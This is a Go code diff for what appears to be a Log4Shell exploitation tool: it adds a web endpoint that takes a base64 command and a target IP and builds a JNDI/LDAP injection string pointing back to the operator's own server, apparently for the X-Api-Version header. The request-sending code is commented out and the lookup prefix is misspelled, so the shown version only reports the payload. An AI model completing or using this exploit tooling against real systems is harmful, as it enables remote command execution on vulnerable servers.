@@ -135,11 +135,61 @@ func main() {
 			"output": out,
 		})
 	})
+	router.GET("/sendpayload", func(c *gin.Context) {
+		payload := c.Query("payload")
+		targetip := c.Query("targetip")
+		if payload == "" {
+			c.JSON(400, gin.H{
+				"error": "Payload is required",
+			})
+			return
+		}
+		if targetip == "" {
+			c.JSON(400, gin.H{
+				"error": "Target IP is required",
+			})
+			return
+		}
+		out, err := SendPayload(payload, targetip)
+		if err != nil {
+			c.JSON(500, gin.H{
+				"error": err.Error(),
+			})
+			return
+		}
+		c.JSON(200, gin.H{
+			"message": out,
+		})
+	})
 	router.Run(":8000")
 }
 
 // -------------------------- Start of Payload Sender -------------------------- //
-func SendPayload() {
+func SendPayload(payload string, targetip string) (string, error) {
+	decodedPayload, err := base64.StdEncoding.DecodeString(payload)
+	if err != nil {
+		return "", err
+	}
+	intIP, err := GetIntIP()
+	if err != nil {
+		return "", err
+	}
+	target := targetip + ":8080"
+	reqPayload := "${jdni:ldap://" + intIP.String() + ":1389/Basic/Command/Base64/" + payload + "}"
+	// req, err := http.NewRequest("GET", "http://"+target+"/", nil)
+	// req.Header.Add("X-Api-Version", "")
+	// if err != nil {
+	// 	return "", err
+	// }
+	// client := &http.Client{
+	// 	Timeout: 5 * time.Second,
+	// }
+	// resp, err := client.Do(req)
+	// if err != nil {
+	// 	return "", err
+	// }
+	// defer resp.Body.Close()
+	return "Payload sent to " + target + " with Decoded-Payload: " + string(decodedPayload) + " and Request-Payload: " + reqPayload, nil
 }
 
 // -------------------------- End of Payload Sender -------------------------- //
@@ -159,7 +209,7 @@ func StartJNDIServer() (string, error) {
 	if err != nil {
 		return "", err
 	}
-	jndiCmd = cmd // Store the command to stop it later
+	jndiCmd = cmd
 	return "JNDI server started on " + intIP.String() + ":8888", nil
 }
 
